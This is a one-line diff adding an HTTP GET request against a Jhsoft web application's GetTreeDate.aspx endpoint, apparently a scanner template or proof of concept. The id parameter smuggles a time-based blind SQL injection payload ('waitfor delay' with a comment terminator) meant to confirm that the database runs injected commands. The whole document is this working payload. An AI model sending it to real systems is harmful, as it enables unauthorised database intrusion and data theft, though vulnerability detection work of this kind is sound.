@@ -1,0 +1,1 @@
+GET /c6/Jhsoft.Web.Appraise/GetTreeDate.aspx/?id={{url(1;waitfor delay'0:0:5'--)}} HTTP/1.1
